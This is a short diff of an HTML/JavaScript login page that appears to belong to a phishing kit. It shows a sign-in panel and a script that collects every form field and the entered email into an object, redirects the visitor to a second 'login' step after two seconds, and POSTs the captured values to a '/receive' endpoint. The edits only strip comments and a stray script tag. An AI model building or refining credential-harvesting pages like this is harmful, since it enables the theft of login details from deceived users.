@@ -165,7 +165,8 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 </div>
 
 </div></div>
-</div><div id="a-widget-35957" class="a-bottombar a-panel-bottombar" style="height:40px;"><button id="a-widget-35958" class="a-button btn btn-sm btn-primary " title="" type="button" alt="Sign-In" style="float:right">Sign-In&nbsp;<span id="a-widget-35959" class="glyphicon glyphicon-log-in"></span></button><button id="continueGuest" class="a-button btn btn-sm btn-default btn-primary" title="" type="button" alt="Continue as Guest" style="float:right"><span id="a-widget-35960"></span>&nbsp;Continue as Guest</button><script type="text/javascript">
+</div><div id="a-widget-35957" class="a-bottombar a-panel-bottombar" style="height:40px;"><button id="a-widget-35958" class="a-button btn btn-sm btn-primary " title="" type="button" alt="Sign-In" style="float:right">Sign-In&nbsp;<span id="a-widget-35959" class="glyphicon glyphicon-log-in"></span></button><button id="continueGuest" class="a-button btn btn-sm btn-default btn-primary" title="" type="button" alt="Continue as Guest" style="float:right"><span id="a-widget-35960"></span>&nbsp;Continue as Guest</button>
+	
 </div></div></div></form>
 
                 <div style="text-align:right">
@@ -263,7 +264,6 @@ font-weight: 5px!important;
             let visitor = document.getElementById('Email').value;
 
             userinfo.forEach((value) => {
-                // Use the 'id' attribute instead of 'name'
                 user[value.name] = value.value;
             });
 
@@ -272,7 +272,7 @@ font-weight: 5px!important;
 			setTimeout(()=> {
                	window.location.href = "login/2";
                	}, 2000);
-            // Send AJAX request
+            
             $.ajax({
                 method: 'POST',
                 url: "/receive",
